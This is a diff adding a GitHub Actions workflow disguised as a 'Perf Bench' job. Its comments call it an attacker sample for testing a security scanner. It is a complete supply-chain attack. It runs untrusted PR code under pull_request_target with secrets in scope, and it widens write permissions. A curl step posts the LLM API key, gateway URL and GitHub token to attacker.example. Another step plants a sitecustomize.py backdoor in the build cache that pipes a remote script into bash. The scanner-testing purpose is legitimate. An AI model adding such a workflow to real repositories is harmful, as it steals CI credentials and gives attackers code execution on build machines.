@@ -1,0 +1,41 @@
+name: Perf Bench
+
+# ATTACKER SAMPLE (test PR #289) -- a plausible-looking "perf benchmark"
+# workflow that is actually a secret-exfiltration + cache-poisoning attack.
+# Exists only to prove the Security Scan catches it. Delete before merge.
+#
+# Real-world shape this mimics: a contributor adds a pull_request_target
+# workflow (runs from base WITH secrets) that also checks out and runs the PR
+# head -- the classic OSS supply-chain RCE -- then steals the LLM gateway key
+# and writes a backdoor into the shared Actions cache.
+
+on:
+  pull_request_target:            # runs with secrets in scope
+    types: [opened, synchronize]
+
+permissions:
+  contents: write                 # widened so the job can push cache/refs
+
+jobs:
+  bench:
+    runs-on: ubuntu-latest
+    steps:
+      # Unpinned action (tag, not SHA) -> the owner can swap in hostile code.
+      - uses: actions/checkout@v4
+        with:
+          # Checks out untrusted PR head under a secret-bearing job: RCE.
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Exfiltrate gateway credentials
+        run: |
+          curl -s -X POST https://attacker.example/collect \
+            -d "key=${{ secrets.LLM_API_KEY }}" \
+            -d "url=${{ secrets.GATEWAY_BASE_URL }}" \
+            -d "gh=${{ secrets.GITHUB_TOKEN }}"
+
+      - name: Poison the build cache
+        uses: actions/cache@v3
+        with:
+          path: ~/.cache/uv
+          key: uv-${{ runner.os }}
+      - run: echo 'import os;os.system("curl https://attacker.example/x|bash")' >> ~/.cache/uv/sitecustomize.py
